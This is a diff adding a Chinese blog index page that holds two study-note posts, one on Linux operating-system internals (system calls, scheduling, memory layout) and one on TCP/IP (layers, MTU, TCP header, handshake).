@@ -150,6 +150,1133 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-操作系统笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/01/操作系统笔记/">操作系统笔记</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/01/操作系统笔记/" class="archive-article-date">
+  	<time datetime="2021-02-01T11:55:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><h2 id="1-知识体系"><a href="#1-知识体系" class="headerlink" title="1.知识体系"></a>1.知识体系</h2><p>操作系统就像一家外包公司：<br><img src="https://img2020.cnblogs.com/blog/1366679/202008/1366679-20200817074202841-25958189.jpg" alt=""></p>
+<p>为了实现系统的运作，其实是由几个子系统支撑完成的：<br><img src="https://img2020.cnblogs.com/blog/1366679/202008/1366679-20200817074244800-1265785301.jpg" alt=""></p>
+<h2 id="2-系统调用"><a href="#2-系统调用" class="headerlink" title="2. 系统调用"></a>2. 系统调用</h2><h3 id="2-1-立项与进程管理"><a href="#2-1-立项与进程管理" class="headerlink" title="2.1 立项与进程管理"></a>2.1 立项与进程管理</h3><ul>
+<li>父进程进行<strong>fork</strong>操作，得到子进程，先从父进程拷贝数据结构，再修该</li>
+<li>子进程调用<strong>execve</strong>执行另一个程序<br>-有个系统调用叫 <strong>waitpid</strong>，父进程能知道子进程是否运行完毕</li>
+</ul>
+<h3 id="2-2-会议室与内存管理"><a href="#2-2-会议室与内存管理" class="headerlink" title="2.2 会议室与内存管理"></a>2.2 会议室与内存管理</h3><ul>
+<li>进程空间内，存放代码的部分叫做<strong>代码段（Code Segment）</strong></li>
+<li>进程内，存放数据的部分叫做<strong>数据段（Data Segment</strong><pre><code>- 局部变量在当前函数有效，离开函数则释放
+- 动态分类的，指明才销毁的，称为堆
+</code></pre></li>
+<li>进程不用的部分就不管，进程需要使用内存的时候，会调用内存管理系统，但是也不代表对应到了真正的物理内存，只有要写入且发现没有物理内存，才会触发一个中断，现分配物理内存</li>
+<li>两个系统调用<pre><code>- **brk**：内存数据量小时，和原来的数据连在一起
+- **mmap**： 数据量大时重新划分一个区域
+</code></pre></li>
+</ul>
+<h3 id="档案库管理与文件管理"><a href="#档案库管理与文件管理" class="headerlink" title="档案库管理与文件管理"></a>档案库管理与文件管理</h3><p>最重要的6个文件操作：</p>
+<ul>
+<li>对已有文件的<strong>打开</strong>和<strong>关闭</strong></li>
+<li><strong>创建</strong></li>
+<li>打开文件以后使用<strong>lseek</strong>跳到文件某个位置</li>
+<li><strong>read</strong>和<strong>write</strong></li>
+</ul>
+<p>每个文件，Linux都会分配一个文件描述符(File Descriptor），这是一个整数。有了这个文件描述符，我们就可以使用系统调用，查看或者干预进程运行的方方面面。<br><img src="https://img2020.cnblogs.com/blog/1366679/202008/1366679-20200820074710151-2140536658.jpg" alt=""></p>
+<h3 id="2-3-项目异常与信号处理"><a href="#2-3-项目异常与信号处理" class="headerlink" title="2.3 项目异常与信号处理"></a>2.3 项目异常与信号处理</h3><p>每种信号都定义了默认动作，也可提供处理函数，可以通过<strong>sigaction</strong>系统调用，注册一个信号处理函数。提供了信号处理服务，进程执行中一旦有变动，就可以及时处理了。</p>
+<h3 id="项目组间沟通与进程间通信"><a href="#项目组间沟通与进程间通信" class="headerlink" title="项目组间沟通与进程间通信"></a>项目组间沟通与进程间通信</h3><ul>
+<li>消息队列<pre><code>- msgsnd发送消息到消息队列
+- msgget创建一个消息队列
+- msgrcv从队列获取消息
+</code></pre></li>
+<li>共享内存<pre><code>- shmget创建共享内存块
+- shmat将共享内存映射到自己的内存空间
+</code></pre></li>
+<li>如何解决同时访问数据的问——举例：Semaphore信号量</li>
+</ul>
+<h3 id="2-4公司间沟通与网络通信"><a href="#2-4公司间沟通与网络通信" class="headerlink" title="2.4公司间沟通与网络通信"></a>2.4公司间沟通与网络通信</h3><p>网络服务通过套接字Socket完成</p>
+<h3 id="2-5-中介与Glibc"><a href="#2-5-中介与Glibc" class="headerlink" title="2.5 中介与Glibc"></a>2.5 中介与Glibc</h3><p>系统调用不是直接使用的，而是使用Glibc。它是Linux下使用的标准C库，为程序员提供丰富的API，封装了操作系统的系统服务。</p>
+<h3 id="2-6-小结"><a href="#2-6-小结" class="headerlink" title="2.6 小结"></a>2.6 小结</h3><p><img src="https://img2020.cnblogs.com/blog/1366679/202008/1366679-20200820080016396-1695385235.jpg" alt=""></p>
+<h2 id="3-x86架构"><a href="#3-x86架构" class="headerlink" title="3.x86架构"></a>3.x86架构</h2><ul>
+<li>CPU 包括: 运算单元, 数据单元, 控制单元<ul>
+<li>运算单元 不知道算哪些数据, 结果放哪</li>
+<li>数据单元 包括 CPU 内部缓存和寄存器, 暂时存放数据和结果</li>
+<li>控制单元 获取下一条指令, 指导运算单元取数据, 计算, 存放结果</li>
+</ul>
+</li>
+<li>进程包含代码段, 数据段等, 以下为 CPU 执行过程:<ul>
+<li>控制单元 通过指令指针寄存器(IP), 取下一条指令, 放入指令寄存器中<ul>
+<li>指令包括操作和目标数据</li>
+</ul>
+</li>
+<li>数据单元 根据控制单元的指令, 从数据段读数据到数据寄存器中</li>
+<li>运算单元 开始计算, 结果暂时存放到数据寄存器</li>
+</ul>
+</li>
+<li>两个寄存器, 存当前进程代码段和数据段起始地址, 在进程间切换</li>
+<li>总线包含两类数据: 地址总线和数据总线</li>
+</ul>
+<hr>
+<ul>
+<li>x86 开放, 统一, 兼容</li>
+<li>数据单元 包含 8个 16位通用寄存器, 可分为 2个 8位使用</li>
+<li>控制单元 包含 IP(指令指针寄存器) 以及 4个段寄存器 CS DS SS ES<ul>
+<li>IP 存放指令偏移量</li>
+<li>数据偏移量存放在通用寄存器中</li>
+<li><code>段地址&lt;&lt;4 + 偏移量</code> 得到地址</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>32 位处理器</li>
+<li>通用寄存器 从 8个 16位拓展为 8个 32位, 保留 16位和 8位使用方式</li>
+<li>IP 从 16位扩展为 32位, 保持兼容</li>
+<li>段寄存器仍为 16位, 由段描述符(表格, 缓存到 CPU 中)存储段的起始地址, 由段寄存器选择其中一项<ul>
+<li>保证段地址灵活性与兼容性</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>16位为实模式, 32位为保护模式</li>
+<li>刚开机为实模式, 需要更多内存切换到保护模式</li>
+</ul>
+<h2 id="4-从BIOS到BootLoader"><a href="#4-从BIOS到BootLoader" class="headerlink" title="4. 从BIOS到BootLoader"></a>4. 从BIOS到BootLoader</h2><h2 id="5-内核初始化"><a href="#5-内核初始化" class="headerlink" title="5. 内核初始化"></a>5. 内核初始化</h2><h3 id="5-1-初始化步骤"><a href="#5-1-初始化步骤" class="headerlink" title="5.1 初始化步骤"></a>5.1 初始化步骤</h3><ul>
+<li>进程初始化：系统启动首先启动0号进程，</li>
+<li>初始化中断门</li>
+<li>初始化内存管理</li>
+<li>创建1号进程</li>
+</ul>
+<h3 id="5-2-从用户态到内核态"><a href="#5-2-从用户态到内核态" class="headerlink" title="5.2 从用户态到内核态"></a>5.2 从用户态到内核态</h3><p>用户态-系统调用-保存寄存器-内核态执行系统调用-恢复寄存器-返回用户态</p>
+<p>##6 系统调用</p>
+<ul>
+<li>gclib对系统调用的封装</li>
+</ul>
+<h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><h2 id="7-进程"><a href="#7-进程" class="headerlink" title="7. 进程"></a>7. 进程</h2><p>###7.1 进程如何从代码到运行</p>
+<ul>
+<li>文件编译生成so文件和可执行文件</li>
+<li>用户态的进程A执行fork，创建进程B</li>
+<li>B会执行exec系列系统调用</li>
+<li>系统调用通过load_elf_binary方法，将可执行文件加载到B的内存中<h2 id="8-线程"><a href="#8-线程" class="headerlink" title="8.线程"></a>8.线程</h2><img src="https://img2020.cnblogs.com/blog/1366679/202008/1366679-20200831073212769-997986416.jpg" alt=""><h2 id="9-进程的数据结构"><a href="#9-进程的数据结构" class="headerlink" title="9.进程的数据结构"></a>9.进程的数据结构</h2></li>
+</ul>
+<p>进程用task_struct表示<br>包含内容</p>
+<ul>
+<li>ID</li>
+<li>信号处理<br>pid 是 process id，tgid 是 thread group ID。<br>任何一个进程，如果只有主线程，那 pid 是自己，tgid 是自己，group_leader 指向的还是自己。<br>但是，如果一个进程创建了其他线程，那就会有所变化了。线程有自己的 pid，tgid 就是进程的主线程的 pid，group_leader 指向的就是进程的主线程。</li>
+<li>任务状态</li>
+<li>进程调度</li>
+<li>运行统计信息</li>
+<li>进程亲缘关系<br>是一个树形结构，保存了parent，children，sibling的指针</li>
+<li>进程权限<pre><code>- uid和gid时进程的真实id，意思是谁启动了进程
+- euid和egid，“起作用”的。当进程要操作消息队列，共享内存，信号量等对象时，比较这个id
+- fsuid和fsgid， filesystem，对文件操作会审核权限
+- 使用chmod u+x可以改变文件的set-useri-id标识位，这样文件的euid和fsuid都改成了当前用户
+</code></pre><ul>
+<li>新加入的capabilities机制用位图表示权限</li>
+</ul>
+</li>
+<li>内存管理</li>
+<li>文件与文件系统</li>
+<li>用户态函数栈<pre><code>- 高地址到低地址，往下增长，入栈出栈都从下面的栈顶开始
+</code></pre></li>
+<li>内核态函数栈<pre><code>- 通过一个pt_regs的struct保存寄存器状态
+- 可以通过task_struct找到内核栈和内核寄存器
+</code></pre></li>
+</ul>
+<h2 id="10-进程的调度"><a href="#10-进程的调度" class="headerlink" title="10. 进程的调度"></a>10. 进程的调度</h2><ul>
+<li>task_struct解决了能”<strong>看到</strong>“哪些问题，还需要解决如何”<strong>做到</strong>“<br>###10.1 调度策略与调度类</li>
+<li>实时进程</li>
+<li>普通进程</li>
+<li>调度策略<pre><code>#define SCHED_NORMAL    0
+#define SCHED_FIFO    1
+#define SCHED_RR    2
+#define SCHED_BATCH    3
+#define SCHED_IDLE    5
+#define SCHED_DEADLINE    6
+</code></pre></li>
+<li><p>调度优先级<br>  int prio, static_prio, normal_prio;<br>  unsigned int rt_priority;</p>
+</li>
+<li><p>实时调度策略</p>
+<pre><code>- FIFO 
+先来先服务
+- RR 
+时间片轮流服务
+- DEADLINE
+选择离当前deadline距离最近的任务
+</code></pre></li>
+<li>普通调度策略<pre><code>- NORMAL
+和名字一样普通
+- BATCH
+后台进程
+- IDLE
+空闲时进行的进程
+</code></pre></li>
+<li>调度策略的封装</li>
+<li>上述变量只是定义了名字，实际上的实现则是由task_struct把调度策略封装在了sched_class中</li>
+<li>完全公平调度算法<br>   CFS：completely fair scheduling<ul>
+<li>记录下进程运行时间，称为一个tick</li>
+<li>cfs会为进程安排一个虚拟运行时间vruntime</li>
+<li>随着进程运行，tick增加，vruntime也增加</li>
+<li>vruntime大则运行时间多，小则少，需要给小的进程分配更多的运行时间</li>
+<li>不同进程有权重，权重高的vruntime高</li>
+</ul>
+</li>
+</ul>
+<h3 id="10-2-调度队列与调度实体"><a href="#10-2-调度队列与调度实体" class="headerlink" title="10.2 调度队列与调度实体"></a>10.2 调度队列与调度实体</h3><ul>
+<li>cfs需要一个数据结构对vruntime进行排序——红黑树<pre><code>- 红黑树：一种自平衡查找树
+</code></pre>Linux的的进程调度完全公平调度程序，用红黑树管理进程控制块，进程的虚拟内存区域都存储在一颗红黑树上，每个虚拟地址区域都对应红黑树的一个节点，左指针指向相邻的地址虚拟存储区域，右指针指向相邻的高地址虚拟地址空间<br><img src="https://blog.csdn.net/u010899985/article/details/80981053" alt="题外话：红黑树的应用"></li>
+<li>cpu运行时的数据结构<br><img src="https://img2020.cnblogs.com/blog/1366679/202009/1366679-20200903112734399-114741590.jpg" alt=""><br>可以看到，一个 CPU 上有一个队列，CFS 的队列是一棵红黑树，树的每一个节点都是一个 sched_entity，每个 sched_entity 都属于一个 task_struct，task_struct 里面有指针指向这个进程属于哪个调度类。</li>
+</ul>
+<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>内存管理要做到三件事：</p>
+<ul>
+<li><ol>
+<li>虚拟内存空间的管理，每个进程看到的地址空间是独立的，互不干扰的</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>物理内存的管理，只有内存管理模块能够使用</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>内存映射，需要将虚拟内存和物理内存管理起来<h3 id="虚拟内存的布局"><a href="#虚拟内存的布局" class="headerlink" title="虚拟内存的布局"></a>虚拟内存的布局</h3><img src="https://img2020.cnblogs.com/blog/1366679/202009/1366679-20200907074857451-67320102.jpg" alt=""></li>
+</ol>
+</li>
+<li>我们从最低位开始排起，先是 Text Segment、Data Segment 和 BSS Segment。Text Segment 是存放二进制可执行代码的位置，Data Segment 存放静态常量，BSS Segment 存放未初始化的静态变量。是不是觉得这几个名字很熟悉？没错，咱们前面讲 ELF 格式的时候提到过，在二进制执行文件里面，就有这三个部分。这里就是把二进制执行文件的三个部分加载到内存里面。</li>
+<li>接下来是堆（Heap）段。堆是往高地址增长的，是用来动态分配内存的区域，malloc 就是在这里面分配的。<br>接下来的区域是 Memory Mapping Segment。这块地址可以用来把文件映射进内存用的，如果二进制的执行文件依赖于某个动态链接库，就是在这个区域里面将 so 文件映射到了内存中。</li>
+<li>再下面就是栈（Stack）地址段。主线程的函数调用的函数栈就是用这里的。</li>
+<li>如果普通进程还想进一步访问内核空间，是没办法的，只能眼巴巴地看着。如果需要进行更高权限的工作，就需要调用系统调用，进入内核。<br>一旦进入了内核，就换了一种视角。刚才是普通进程的视角，觉着整个空间是它独占的，没有其他进程存在。当然另一个进程也这样认为，因为它们互相看不到对方。这也就是说，不同进程的 0 号到 29 号会议室放的东西都不一样。</li>
+<li>但是到了内核里面，无论是从哪个进程进来的，看到的都是同一个内核空间，看到的都是同一个进程列表。虽然内核栈是各用各的，但是如果想知道的话，还是能够知道每个进程的内核栈在哪里的。所以，如果要访问一些公共的数据结构，需要进行锁保护。也就是说，不同的进程进入到内核后，进入的 30 号到 39 号会议室是同一批会议室。</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">操作系统</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/01/操作系统笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-TCP-IP笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/01/TCP-IP笔记/">TCP/IP笔记</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/01/TCP-IP笔记/" class="archive-article-date">
+  	<time datetime="2021-02-01T11:55:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="第1章-概述"><a href="#第1章-概述" class="headerlink" title="第1章 概述"></a>第1章 概述</h1><h2 id="1-2-分层"><a href="#1-2-分层" class="headerlink" title="1.2 分层"></a>1.2 分层</h2><ol>
+<li>链路层。也称数据链路层或网络接口层，包括设备驱动程序和网络接口卡，它们一起处理与电缆的物理接口细节。</li>
+<li>网络层。处理分组在网络中的活动，如分组的选路；网络层的协议包括IP协议、ICMP协议（Internet互联网控制报文协议）、IGMP协议（Internet组管理协议）。</li>
+<li>传输层。主要为两台主机上的应用程序提供端到端的通信，包括TCP（传输控制协议）和UDP（用户数据报协议）。</li>
+<li>应用层。处理特定的应用程序细节。<h2 id="1-3-TCP-IP分层"><a href="#1-3-TCP-IP分层" class="headerlink" title="1.3 TCP/IP分层"></a>1.3 TCP/IP分层</h2><img src="https://images2015.cnblogs.com/blog/37882/201510/37882-20151003232315105-1052171064.png" alt=""><h2 id="1-4-网络IP分类"><a href="#1-4-网络IP分类" class="headerlink" title="1.4 网络IP分类"></a>1.4 网络IP分类</h2><img src="https://images2015.cnblogs.com/blog/37882/201510/37882-20151003232315355-347339440.png" alt=""></li>
+</ol>
+<p><img src="https://images2015.cnblogs.com/blog/37882/201510/37882-20151003232315605-831992070.png" alt=""></p>
+<p>#第2章 链路层</p>
+<h2 id="2-1-引言"><a href="#2-1-引言" class="headerlink" title="2.1 引言"></a>2.1 引言</h2><p>链路层目的</p>
+<ul>
+<li>为IP模块发送和接收IP数据报</li>
+<li>为ARP模块发送ARP请求和接收ARP应答</li>
+<li>为RARP发送RARP请求和接收RARP应答</li>
+</ul>
+<p>(ARP叫做地址解析协议，是用IP地址换MAC地址的一种协议RARP则叫做逆地址解析协议)</p>
+<p>-</p>
+<h2 id="2-2-链路层的传销接口链路层协议"><a href="#2-2-链路层的传销接口链路层协议" class="headerlink" title="2.2 链路层的传销接口链路层协议"></a>2.2 链路层的传销接口链路层协议</h2><p>ppp(点对点协议)是从SLIP的替代品。他们都提供了一种低速接入的解决方案。而每一种数据链路层协议，都有一个MTU（最大传输单元）定义，在这个定义下面，如果IP数据报过大，则要进行分片(fragmentation)，使得每片都小于MTU，注意PPP的MTU并不是一个物理定义，而是指一个逻辑定义（个人认为就是用程序控制）。可以用netstat来打印出MTU的结果，比如键入netstat -in：</p>
+<p>Kernel Interface table<br>Iface      MTU Met    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg<br>eth0      1500  0    1774     0     0     0     587     0     0     0 BMRU<br>lo       16436  0    2667     0     0     0    2667     0     0     0 LRU</p>
+<p> 就可以观察到eth0的MTU是1500。而lo（环回接口）的MTU则是16436。</p>
+<h2 id="2-3-环回接口"><a href="#2-3-环回接口" class="headerlink" title="2.3 环回接口"></a>2.3 环回接口</h2><p> 最后说说那个环回接口（loopback）。平时我们用127.0.0.1来尝试自己的机器服务器好使不好使。走的就是这个loopback接口。对于环回接口，有如下三点值得注意:</p>
+<ul>
+<li>传给环回地址（一般是127.0.0.1）的任何数据均作为I P输入。</li>
+<li>传给广播地址或多播地址的数据报复制一份传给环回接口，然后送到以太网上。这是 因为广播传送和多播传送的定义包含主机本身。</li>
+<li>任何传给该主机IP地址的数据均送到环回接口。</li>
+</ul>
+<h2 id="MTU"><a href="#MTU" class="headerlink" title="MTU"></a>MTU</h2><p>数据帧长度的限制，是一个逻辑限制，目的是为交互使用提供足够的响应时间。</p>
+<h1 id="第3章-IP-网际协议"><a href="#第3章-IP-网际协议" class="headerlink" title="第3章 IP:网际协议"></a>第3章 IP:网际协议</h1><h1 id="第17章-TCP-传输控制协议"><a href="#第17章-TCP-传输控制协议" class="headerlink" title="第17章 TCP:传输控制协议"></a>第17章 TCP:传输控制协议</h1><p>第17章 TCP：传输控制协议</p>
+<h2 id="17-1-TCP服务"><a href="#17-1-TCP服务" class="headerlink" title="17.1 TCP服务"></a>17.1 TCP服务</h2><p>尽管TCP和UDP都使用相同的网络层（IP），TCP却向应用层提供与UDP完全不同的服务。TCP提供一种面向连接的、可靠的字节流服务。</p>
+<h3 id="17-1-1-面向连接"><a href="#17-1-1-面向连接" class="headerlink" title="17.1.1 面向连接"></a>17.1.1 面向连接</h3><p>两个使用TCP的应用（通常是一个客户和一个服务器）在彼此交换数据之前必须先建立一个TCP连接。过程与打电话相似，先拨号振铃，等待对方摘机说“喂”，然后才说明是谁。</p>
+<p>说明：在一个TCP连接中，仅有两方彼此进行通信。广播和多播不能用于TCP。</p>
+<h3 id="17-1-2-可靠性"><a href="#17-1-2-可靠性" class="headerlink" title="17.1.2 可靠性"></a>17.1.2 可靠性</h3><p>TCP通过下列方式来提供可靠性：</p>
+<ul>
+<li>应用数据被分割成TCP认为最适合发送的数据块。由TCP传递给IP的信息单位称为报文段或段。</li>
+</ul>
+<p>注意：对于UDP，应用程序产生的数据报长度将保持不变。</p>
+<ul>
+<li><p>当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。</p>
+</li>
+<li><p>当TCP收到发自TCP连接另一端的数据，它将发送一个确认。这个确认不是立即发送，通常将推迟几分之一秒。</p>
+</li>
+<li><p>TCP将保持它的首部和数据检验和。这是一个端到端的检验和，如果收到段的检验和有差错，TCP将丢弃这个报文段和不确认收到此报文段（希望发端超时并重发）。</p>
+</li>
+<li><p>因为TCP报文段是作为IP数据报来传输的，而IP数据报的到达可能会失序，所以TCP报文段的到达也可能会失序。如果必要，TCP将对收到的数据进行重新排序，将收到的数据以正确的顺序交给应用层。</p>
+</li>
+<li><p>因为IP数据报会发生重复，所以TCP的接收端必须丢弃重复的数据。</p>
+</li>
+<li><p>TCP提供流量控制。TCP连接的每一方都有固定大小的缓冲区。TCP的接收端只允许另一端发送其缓冲区所能接纳的数据。可防止较快主机致使较慢主机的缓冲区溢出。</p>
+</li>
+</ul>
+<p>说明：</p>
+<p>1）两个应用程序通过TCP连接交换8 bit构成的字节流。TCP不在字节流中插入记录标识符。将这称为字节流服务。</p>
+<p>2）假设一方的应用程序先传10字节，又传20字节，再传50字节，连接的另一方将无法了解发方每次发送了多少字节。收方可以分4次接收这80个字节，每次接收20字节。</p>
+<p>3）TCP对字节流的内容不作任何解释，它不知道传输的数据字节流是二进制数据、ASCII字符、EBCDIC字符或其他类型数据。由TCP双方的应用层对字节流进行解释。</p>
+<p>2、TCP首部</p>
+<p>TCP数据被封装在一个IP数据报中，如图17-1所示。<br><img src="https://images0.cnblogs.com/blog2015/697266/201504/221940145468929.png" alt=""></p>
+<p>图17-2显示TCP首部的数据格式。如果不计选项字段，它通常是20个字节。<br><img src="https://images0.cnblogs.com/blog2015/697266/201504/221941291718831.png" alt=""></p>
+<p>TCP首部字段说明：</p>
+<p>（1）TCP段包含的源端和目的端端口号，是用于寻找发端和收端应用进程。</p>
+<p>说明：源端和目的端端口号加上源端IP地址和目的端IP地址唯一确定一个TCP连接。</p>
+<p>（2）序号用来标识从TCP发端向收端发送的数据字节流。如果将字节流看作是在两个应用程序间的单向流动，则TCP用序号对每个字节进行计数。序号是32 bit的无符号数，到达2^32-1后又从0开始。</p>
+<p>说明：TCP为应用层提供全双工服务。这意味着数据能在两个方向上独立进行传输。所以，连接的每一端必须保持每个方向上的传输数据序号。</p>
+<p>（3）当建立一个新的连接时，SYN标志置1。</p>
+<p>（4）因为每个传输的字节都被计数，确认序号包含发送确认的一端所期望收到的下一个序号，即确认序号是上次已成功收到数据字节序号加1。</p>
+<p>注意：只有ACK标志为1时确认序号字段才有效。</p>
+<p>（5）发送ACK无需任何代价，因为32 bit的确认序号字段和ACK标志一样，总是TCP首部的一部分。因此，一旦一个连接建立起来，这个字段总是被设置，ACK标志也总是被设置为1。</p>
+<p>（6）首部长度给出首部中32 bit字的数目。需要这个值是因为任选字段的长度是可变的。这个字段占4 bit，因此TCP最多有60字节的首部（32bit*(2^4-1)）。如果没有选项字段，正常的长度是20字节。</p>
+<p>（7）TCP首部中有6个标志比特，它们中的多个可同时被设置为1。含义为：</p>
+<p>1）URG 紧急指针有效。</p>
+<p>2）ACK 确认序号有效。</p>
+<p>3）PSH 接收方应该尽快将这个报文段交给应用层。</p>
+<p>4）RST 重建连接。</p>
+<p>5）SYN 同步序号用来发起一个连接。</p>
+<p>6）FIN 发端完成发送任务。</p>
+<p>（8）TCP的流量控制由连接的每一端通过声明的窗口大小来提供。窗口大小为字节数，起始于确认序号字段指明的值，这个值是接收端期望接收的字节。窗口大小是一个16 bit字段，因而窗口大小最大为65535字节。</p>
+<p>（9）检验和覆盖了整个TCP报文段包括TCP首部和TCP数据。这是一个强制性的字段，一定是由发端计算和存储，并由收端进行验证。</p>
+<p>说明：TCP检验和的计算与UDP检验和的计算相似，使用一个伪首部。</p>
+<p>（10）只有当URG标志置1时紧急指针才有效。紧急指针是一个正的偏移量，和序号字段中的值相加表示紧急数据最后一个字节的序号。TCP的紧急方式是发送端向另一端发送紧急数据的一种方式。</p>
+<p>（11）最常见的选项字段是最长报文大小，又称为MSS (Maximum Segment Size)。每个连接方通常都在通信的第一个报文段（为建立连接而设置SYN标志的那个段）中指明这个选项。它指明本端所能接收的最大长度的报文段。</p>
+<p>（12）TCP报文段中的数据部分是可选的。例如：一个连接建立和终止时，双方交换的报文段仅有TCP首部。在处理超时的许多情况中，也会发送不带任何数据的报文段。</p>
+<p>小结：</p>
+<p>（1）TCP提供了一种可靠的面向连接的字节流运输层服务。</p>
+<p>（2）TCP将用户数据打包构成报文段；它发送数据后启动一个定时器；另一端对收到的数据进行确认，对失序的数据重新排序，丢弃重复数据；TCP提供端到端的流量控制，并计算和验证一个强制性的端到端检验和。</p>
+<p>（3）许多流行的应用程序如Telnet、Rlogin、FTP和SMTP都使用TCP。</p>
+<h1 id="第18章-TCP连接的建立与终止"><a href="#第18章-TCP连接的建立与终止" class="headerlink" title="第18章 TCP连接的建立与终止"></a>第18章 TCP连接的建立与终止</h1><h2 id="1、引言"><a href="#1、引言" class="headerlink" title="1、引言"></a>1、引言</h2><p>TCP是一个面向连接的协议。无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。</p>
+<h2 id="2、连接的建立与终止"><a href="#2、连接的建立与终止" class="headerlink" title="2、连接的建立与终止"></a>2、连接的建立与终止</h2><p>（1）建立连接协议</p>
+<p>如果18-3所示，为了建立一条TCP连接：</p>
+<p><img src="https://images0.cnblogs.com/blog2015/697266/201504/222117276092162.png" alt=""></p>
+<p>1）请求端（客户）发送一个SYN段指明客户打算连接的服务器的端口，以及初始序号（ISN，例子中为1415531521），如报文1。</p>
+<p>2）服务器发回包含服务器的初始序号的SYN报文段（报文段2）作为应答。同时，将确认序号设置为客户的ISN加1以对客户的SYN报文段进行确认。一个SYN将占用一个序号。</p>
+<p>3）客户必须将确认序号设置为服务器的ISN加1以对服务器的SYN报文段进行确认（报文段3）。</p>
+<p>这三个报文段完成连接的建立，这个过程也称为三次握手。</p>
+<p>说明：</p>
+<p>1）发送第一个SYN的一端将执行主动打开，接收这个SYN并发回下一个SYN的另一端执行被动打开。</p>
+<p>2）当一端为建立连接而发送它的SYN时，它为连接选择一个初始序号。ISN随时间而变化，因此每个连接都将具有不同的ISN。</p>
+<p>（2）终止连接</p>
+<p>终止一个连接要经过4次握手。这是由TCP的半关闭造成的。</p>
+<p>说明：</p>
+<p>1）因为TCP是全双工的（数据在两个方向上能同时传递），因此每个方向必须单独进行关闭。原则是：当一方完成它的数据发送任务后发送一个FIN来终止这个方向连接。当一端收到一个FIN时，它必须通知应用层另一端已经终止了那个方向的数据传送。</p>
+<p>注意：发送FIN通常是应用层进行关闭的结果。</p>
+<p>2）收到一个FIN只意味着在这一方向上没有数据流动。</p>
+<p>注意：一个TCP连接在收到一个FIN后仍能发送数据，这对利用半关闭的应用来说是可能的，尽管在实际应用中只有很少的TCP应用程序这样做。</p>
+<p>图18-4显示了终止一个连接的典型握手顺序。</p>
+<p><img src="https://images0.cnblogs.com/blog2015/697266/201504/222146082184141.png" alt=""></p>
+<p>发送FIN将导致应用程序关闭它们的连接，这些FIN的ACK是由TCP软件自动产生的。</p>
+<p>##3.  建立连接的超时</p>
+<ul>
+<li>重传机制，采用一种500ms的定时器，初始为12个定时器（6秒），当12个都为0时，发出一个新的TCP请求，还是超时，初始化48个定时器（24秒）<h2 id="4-最大报文长度"><a href="#4-最大报文长度" class="headerlink" title="4. 最大报文长度"></a>4. 最大报文长度</h2>不同设备的MTU不一样，有一个协商的过程：<br><img src="https://img-blog.csdn.net/20160403234524091" alt=""><br>路径MTU发现的基本思想是源主机最初假设到目的主机的路径MTU为源主机发送这个报文的第一跳接口的MTU，并把发送到主机的所有IP报文的IP头中的DF位置一。在这个转发路径中的某个路由器收到某个报文，要从某个出接口出去的时候发现该报文大于出接口的MTU，并且其FD位4为1，该路由器将会丢弃本报文，并且返回一个ICMP目的地址不可达报文通知被丢弃报文的源主机，源主机收到这个ICMP报文后就减小假定的这条路径上的PMTU值。</li>
+</ul>
+<p>最大报文段长度表示TCP传往另一端的最大块数据的长度。当一个连接建立时，连接的双方都要通告各自的MSS。它是一个可“协商”选项，当建立一个连接是，每一方都有用于通告它期望接收的MSS选项。而且在协商过后，该选项内容可以改变，也可以没有。在协商MSS时，一般是建立TCP连接的两端发送【SYN】标志报文时互相通报，然后选取最小MSS作为双方的约定。如果双方都不通报，或有一方不通报，一般选择MSS的默认值536.</p>
+<h2 id="5-TCP的半关闭"><a href="#5-TCP的半关闭" class="headerlink" title="5. TCP的半关闭"></a>5. TCP的半关闭</h2><p>因为数据传输是双向的，采用半关闭可以在一端关闭时，另一端继续传输</p>
